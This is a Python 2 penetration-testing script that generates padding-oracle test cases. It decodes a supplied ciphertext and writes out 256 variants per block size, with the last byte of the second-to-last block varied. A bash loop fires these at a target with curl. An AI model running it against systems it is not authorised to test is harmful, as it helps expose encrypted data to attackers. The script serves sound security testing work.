#!/usr/bin/python
#
#   Padding Oracle test-cases generator.
#   Mariusz B. / mgeeky, 2016
#   v0.2
# 
#   Simple utility that aids the penetration tester when manually testing Padding Oracle condition
#   of a target cryptosystem, by generating set of test cases to fed the cryptosystem with.
#
# Script that takes from input an encoded cipher text, tries to detect applied encoding, decodes the cipher
# and then generates all the possible, reasonable cipher text transformations to be used while manually
# testing for Padding Oracle condition of cryptosystem. The output of this script will be hundreds of
# encoded values to be used in manual application testing approaches, like sending requests.
#
# One of possible scenarios and ways to use the below script could be the following:
#   - clone the following repo: https://github.com/GDSSecurity/PaddingOracleDemos
#   - launch pador.py which is an example of application vulnerable to Padding Oracle
#   - then by using `curl http://localhost:5000/echo?cipher=<ciphertext>` we are going to manually
#       test for Padding Oracle outcomes. The case of returning something not being a 'decryption error'
#       result would be considered padding-hit, therefore vulnerability proof.
#
#   This script could be then launched to generate every possible test case of second to the last block
#   being filled with specially tailored values (like vector of zeros with last byte ranging from 0-255)
#   and then used in some kind of local http proxy (burp/zap) or http client like (curl/wget).
#
# Such example usage look like:
#
#---------------------------------------------
# bash$ x=0 ; for i in $(./padding-oracle-tests.py 484b850123a04baf15df9be14e87369bc59ca16e1f3645ef53cc6a4d9d87308ed2382fb0a54f3a2954bfebe0a04dd4d6); \
#   do curl -s http://host:5000/echo?cipher=$i | grep -qv 'error' && printf "Byte: 0x%02x not generated decryption error.\n" $x ; x=$((x+1)); done
#
# [?] Data resembles block cipher with block size = 16
# [?] Data resembles block cipher with block size = 8
# 
# Generated in total: 512 test cases for 8, 16 block sizes.
# Byte: 0x87 not generated decryption error.
#---------------------------------------------
#
# There the script took at it's first parameter the hex encoded parameter, used it to feed test cases generator and resulted with 512
# test cases varying with the last byte of the second to the last block:
#   (...)
#   484b850123a04baf15df9be14e87369b000000000000000000000000000000fad2382fb0a54f3a2954bfebe0a04dd4d6
#   484b850123a04baf15df9be14e87369b000000000000000000000000000000fbd2382fb0a54f3a2954bfebe0a04dd4d6
#   484b850123a04baf15df9be14e87369b000000000000000000000000000000fcd2382fb0a54f3a2954bfebe0a04dd4d6
#   484b850123a04baf15df9be14e87369b000000000000000000000000000000fdd2382fb0a54f3a2954bfebe0a04dd4d6
#   484b850123a04baf15df9be14e87369b000000000000000000000000000000fed2382fb0a54f3a2954bfebe0a04dd4d6
#   484b850123a04baf15df9be14e87369b000000000000000000000000000000ffd2382fb0a54f3a2954bfebe0a04dd4d6
#   484b850123a04baf15df9be14e87369bc59ca16e1f3645ef53cc6a4d9d87308e000000000000000054bfebe0a04dd4d6
#   484b850123a04baf15df9be14e87369bc59ca16e1f3645ef53cc6a4d9d87308e000000000000000154bfebe0a04dd4d6
#   484b850123a04baf15df9be14e87369bc59ca16e1f3645ef53cc6a4d9d87308e000000000000000254bfebe0a04dd4d6
#   484b850123a04baf15df9be14e87369bc59ca16e1f3645ef53cc6a4d9d87308e000000000000000354bfebe0a04dd4d6
#   484b850123a04baf15df9be14e87369bc59ca16e1f3645ef53cc6a4d9d87308e000000000000000454bfebe0a04dd4d6
#   484b850123a04baf15df9be14e87369bc59ca16e1f3645ef53cc6a4d9d87308e000000000000000554bfebe0a04dd4d6
#   484b850123a04baf15df9be14e87369bc59ca16e1f3645ef53cc6a4d9d87308e000000000000000654bfebe0a04dd4d6
#   (...)
#
# At the end, those values were used in for loop to launch for every entry a curl client with request to the Padding Oracle.
# The 0x87 byte that was catched was the only one that has not generated a 'decryption error' outcome from the request, resulting
# in improperly decrypted plain-text from attacker-controled cipher text.
#

import re
import sys
import urllib
import binascii as ba
import base64

# Flip this variable when your input data is not being properly processed.
DEBUG = False


def info(txt):
    sys.stderr.write(txt + '\n')

def warning(txt):
    info('[?] ' + txt)

def error(txt):
    info('[!] ' + txt)

def dbg(txt):
    if DEBUG:
        info('[dbg] '+txt)

# or maybe:
#   class PaddingOracleTestCasesWithVaryingSecondToTheLastBlockGenerator
class PaddingOracleTestCasesGenerator:
    NONE   = 0
    B64URL = 1
    B64STD = 2
    HEXENC = 3

    data = ''
    offset = 0
    encoding = NONE
    blocksizes = set()
    urlencoded = False

    def __init__(self, data, blocksize=0):
        self.data = data
        len_before = len(data)
        self.encoding = self.detect_encoding()
        self.data = self.decode(data)

        if blocksize != 0:
            assert blocksize % 8 == 0, "Blocksize must be divisible by 8"
            self.blocksizes = [blocksize,]
        else:
            self.detect_blocksize()

        self.data_evaluation(len_before)

    def data_evaluation(self, len_before):
        def entropy(txt):
            import math
            from collections import Counter
            p, lns = Counter(txt), float(len(txt))
            return -sum( count / lns * math.log(count/lns, 2) for count in p.values())

        e = entropy(self.data)
        warning('Data size before and after decoding: %d -> %d' % (len_before, len(self.data)))
        warning('Data entropy: %.6f' % entropy(self.data))

        if e < 5.0:
            info('\tData does not look random, not likely to deal with block cipher.')    
        elif e >= 5.0 and e < 7.0:
            info('\tData only resembles random stream, hardly to be dealing with block cipher.')
        else:
            info('\tHigh likelihood of dealing with block cipher. That\'s good.')

        if self.offset != 0:
            warning('Data structure not resembles block cipher.')
            warning('Proceeding with sliding window of %d bytes in the beginning and at the end\n' % self.offset)
        else:
            warning('Data resembles block cipher with block size = %d' % max(self.blocksizes))

    def detect_encoding(self):
        b64url = '^[a-zA-Z0-9_\-]+={0,2}$'
        b64std = '^[a-zA-Z0-9\+\/]+={0,2}$'
        hexenc1 = '^[0-9a-f]+$'
        hexenc2 = '^[0-9A-F]+$'

        data = self.data
        if re.search('%[0-9a-f]{2}', self.data, re.I) != None:
            dbg('Sample is url-encoded.')
            data = urllib.unquote_plus(data)
            self.urlencoded = True

        if (re.match(hexenc1, data) or re.match(hexenc2, data)) and len(data) % 2 == 0:
            dbg('Hex encoding detected.')
            return self.HEXENC

        if re.match(b64url, data):
            dbg('Base64url encoding detected.')
            return self.B64URL

        if re.match(b64std, data):
            dbg('Standard Base64 encoding detected.')
            return self.B64STD

        error('Warning: Could not detect data encoding. Going with plain data.')
        return self.NONE

    def detect_blocksize(self):
        sizes = [32, 16, 8]     # Correspondigly: 256, 128, 64 bits

        self.offset = len(self.data) % 8
        datalen = len(self.data) - self.offset

        for s in sizes:
            if datalen % s == 0 and datalen / s >= 2:
                self.blocksizes.add(s)

        if not len(self.blocksizes):
            if datalen >= 32:
                self.blocksizes.add(16)
            if datalen >= 16:
                self.blocksizes.add(8)

        if not len(self.blocksizes):
            raise Exception("Could not detect data's blocksize automatically.")

    def encode(self, data):
        def _enc(data):
            if self.encoding == PaddingOracleTestCasesGenerator.B64URL:
                return base64.urlsafe_b64encode(data)
            elif self.encoding == PaddingOracleTestCasesGenerator.B64STD:
                return base64.b64encode(data)
            elif self.encoding == PaddingOracleTestCasesGenerator.HEXENC:
                return ba.hexlify(data).strip()
            else:
                return data

        enc = _enc(data)
        if self.urlencoded:
            return urllib.quote_plus(enc)
        else:
            return enc

    def decode(self, data):
        def _decode(self, data):
            if self.urlencoded:
                data = urllib.unquote_plus(data)
            
            if self.encoding == PaddingOracleTestCasesGenerator.B64URL:
                return base64.urlsafe_b64decode(data)
            elif self.encoding == PaddingOracleTestCasesGenerator.B64STD:
                return base64.b64decode(data)
            elif self.encoding == PaddingOracleTestCasesGenerator.HEXENC:
                return ba.unhexlify(data).strip()
            else:
                return data

        dbg("Hex dump of data before decoding:\n" + hex_dump(data))
        decoded = _decode(self, data)
        dbg("Hex dump of data after decoding:\n" + hex_dump(decoded))
        return decoded

    def construct_second_to_last_block(self, data, blocksize, value, offset=0):

        assert len(data) >= 2 * blocksize, "Too short data to operate on it with given blocksize."
        assert abs(offset) < blocksize, "Incorrect offset was specified. Out-of-bounds access."

        # Null vector with the last byte set to iterated value.
        block = '0' * (2*(blocksize-1)) + '%02x' % value

        if offset >= 0:
            # datadata<rest>
            return data[:-2*blocksize-offset] + ba.unhexlify(block) + data[-blocksize-offset:]
        else:
            # <rest>datadata
            return data[-offset:-2*blocksize] + ba.unhexlify(block) + data[-blocksize:]

    def generate_test_cases(self):
        cases = []
        data = self.data
        for size in self.blocksizes:
            dbg("Now generating test cases of %d blocksize." % size)
            for byte in range(256):

                # No offset
                cases.append(self.encode(self.construct_second_to_last_block(data, size, byte)))

                if self.offset != 0:
                    cases.append(self.encode(self.construct_second_to_last_block(data, size, byte, self.offset)))
                    cases.append(self.encode(self.construct_second_to_last_block(data, size, byte, -self.offset)))
         
        return cases

def hex_dump(data):
    s = ''
    n = 0
    lines = []

    if len(data) == 0:
        return '<empty>'

    for i in range(0, len(data), 16):
        line = ''
        line += '%04x | ' % (i)
        n += 16

        for j in range(n-16, n):
            if j >= len(data): break
            line += '%02x ' % ord(data[j])

        line += ' ' * (3 * 16 + 7 - len(line)) + ' | '

        for j in range(n-16, n):
            if j >= len(data): break
            c = data[j] if not (ord(data[j]) < 0x20 or ord(data[j]) > 0x7e) else '.'
            line += '%c' % c

        lines.append(line)

    return '\n'.join(lines)

def main():
    info('\n\tPadding Oracle test-cases generator')
    info('\tMariusz B. / mgeeky, 2016\n')

    if len(sys.argv) < 2:
        warning('usage: padding-oracle-tests.py <data> [blocksize]')
        sys.exit(0)

    data = sys.argv[1].strip()
    bsize = int(sys.argv[2]) if len(sys.argv) > 2 else 0

    try:
        tester = PaddingOracleTestCasesGenerator(data, bsize)
    except Exception as e:
        error(str(e))
        return False

    s = hex_dump(tester.data)
    info('Decoded data:\n%s\n' % s)

    cases = tester.generate_test_cases()

    for case in cases:
        if DEBUG:
            dbg('...' + case[-48:])
        else:
            print case
    
    info('\n[+] Generated in total: %d test cases for %s block sizes.' \
        % (len(cases), ', '.join([str(e) for e in sorted(tester.blocksizes)])))


if __name__ == '__main__':
    main()
